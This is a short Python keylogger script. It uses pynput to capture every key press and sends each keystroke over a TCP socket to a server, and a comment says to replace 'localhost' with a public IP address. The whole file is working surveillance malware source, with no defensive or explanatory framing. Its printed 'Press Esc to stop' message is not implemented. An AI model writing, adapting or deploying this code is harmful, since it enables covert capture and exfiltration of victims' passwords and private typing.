from pynput.keyboard import Key, Listener
import socket

# Define server address and port
SERVER_HOST = 'localhost'  # Replace with your public IP address
SERVER_PORT = 12345

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_HOST, SERVER_PORT))

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        # Send the pressed key to the server
        client_socket.send(str(key).encode())
        
    except Exception as e:
        print(f'Error: {e}')

# This function will be called whenever a key is released
def on_release(key):
    pass  # Do nothing

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    print('Keylogger started. Press Esc to stop.')
    listener.join()

# Close the connection after keylogging is finished
client_socket.close()
